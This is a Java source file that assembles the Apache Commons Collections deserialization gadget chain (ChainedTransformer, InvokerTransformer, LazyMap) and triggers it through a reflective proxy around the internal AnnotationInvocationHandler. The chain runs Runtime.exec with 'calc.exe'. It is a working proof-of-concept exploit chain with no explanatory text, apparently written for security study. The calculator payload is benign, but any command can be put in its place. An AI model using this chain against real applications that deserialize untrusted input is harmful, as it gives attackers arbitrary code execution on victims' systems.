package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class AnnotationInvocationHandlerTrigger {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, null}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc.exe"})
        });
        Map lazyMap = LazyMap.decorate(new HashMap(),chainedTransformer);

        Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class,lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(null, HashMap.class.getInterfaces(), handler);
        proxy.clear();
    }
}
